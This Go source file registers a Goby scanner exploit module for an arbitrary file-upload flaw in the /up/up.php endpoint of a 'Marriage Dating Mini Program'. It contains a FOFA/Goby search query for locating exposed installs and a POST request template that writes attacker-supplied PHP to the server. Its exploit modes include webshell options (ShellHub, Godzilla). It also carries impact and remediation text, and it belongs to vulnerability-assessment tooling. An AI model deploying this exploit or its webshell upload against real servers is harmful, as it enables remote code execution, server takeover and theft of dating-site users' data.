package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Marriage Dating Mini Program /up/up.php File Upload Vulnerability",
    "Description": "<p>The Marriage Dating Mini Program is an online mini program for matchmaking and dating, offering user matching, chatting, and other features. The /up/up.php interface of this program has an arbitrary file write vulnerability. Attackers can send specially crafted POST requests to this interface to write arbitrary content to files in specified paths on the server. By exploiting this vulnerability, attackers can upload malicious script files to achieve remote code execution, potentially leading to sensitive information leakage, complete server control, and other severe consequences.</p>",
    "Product": "Marriage Dating Mini Program",
    "Homepage": "https://www.zeai.cn/",
    "DisclosureDate": "2024-11-29",
    "PostTime": "2025-01-21",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"cache/areadata.js\" && body=\"婚恋\"",
    "GobyQuery": "body=\"cache/areadata.js\" && body=\"婚恋\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to write arbitrary files on the target server, potentially leading to remote code execution, sensitive data leakage, and complete server control.</p>",
    "Recommendation": "<p>It is recommended to immediately fix this vulnerability, restrict access to the file upload functionality, and strictly validate the type and content of uploaded files. Additionally, it is advised to upgrade the server environment to the latest version and deploy a Web Application Firewall (WAF) to prevent malicious requests.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Godzilla,Customize",
            "show": ""
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/up/up.php?filename={{{rand_file_name_prefix}}}{{{FILENAME}}}&submitok=default",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{{{CONTENT}}}//&filetype=video"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "1",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "某婚恋相亲小程序 /up/up.php 文件上传漏洞",
            "Product": "某婚恋相亲小程序",
            "Description": "<p>某婚恋相亲小程序是一款用于婚恋交友的在线小程序，提供用户匹配、聊天等功能。该程序的 /up/up.php 接口存在文件上传漏洞，攻击者可以通过向该接口发送特制的POST请求，将任意内容写入服务器指定路径的文件中。利用该漏洞，攻击者可以上传恶意脚本文件，从而实现远程代码执行，可能导致敏感信息泄露、服务器被完全控制等严重后果。</p>",
            "Recommendation": "<p>建议立即修复该漏洞，限制文件上传功能的访问权限，并严格验证上传文件的类型和内容。同时，建议升级服务器环境到最新版本，并部署WAF（Web应用防火墙）以防止恶意请求。</p>",
            "Impact": "<p>该漏洞允许攻击者在目标服务器上写入任意文件，可能导致远程代码执行、敏感数据泄露以及服务器被完全控制等严重后果。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Marriage Dating Mini Program /up/up.php File Upload Vulnerability",
            "Product": "Marriage Dating Mini Program",
            "Description": "<p>The Marriage Dating Mini Program is an online mini program for matchmaking and dating, offering user matching, chatting, and other features. The /up/up.php interface of this program has an arbitrary file write vulnerability. Attackers can send specially crafted POST requests to this interface to write arbitrary content to files in specified paths on the server. By exploiting this vulnerability, attackers can upload malicious script files to achieve remote code execution, potentially leading to sensitive information leakage, complete server control, and other severe consequences.</p>",
            "Recommendation": "<p>It is recommended to immediately fix this vulnerability, restrict access to the file upload functionality, and strictly validate the type and content of uploaded files. Additionally, it is advised to upgrade the server environment to the latest version and deploy a Web Application Firewall (WAF) to prevent malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to write arbitrary files on the target server, potentially leading to remote code execution, sensitive data leakage, and complete server control.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "rand_file_name_prefix": "define|variable|{{{rand|str|8}}}",
        "FILE_PATH": "define|variable|/up/{{{rand_file_name_prefix}}}{{{FILENAME}}}",
        "VUL_URL": "define|variable|{{{fixedhostinfo}}}/up/up.php"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "rand_file_name_prefix",
        "FILE_PATH",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}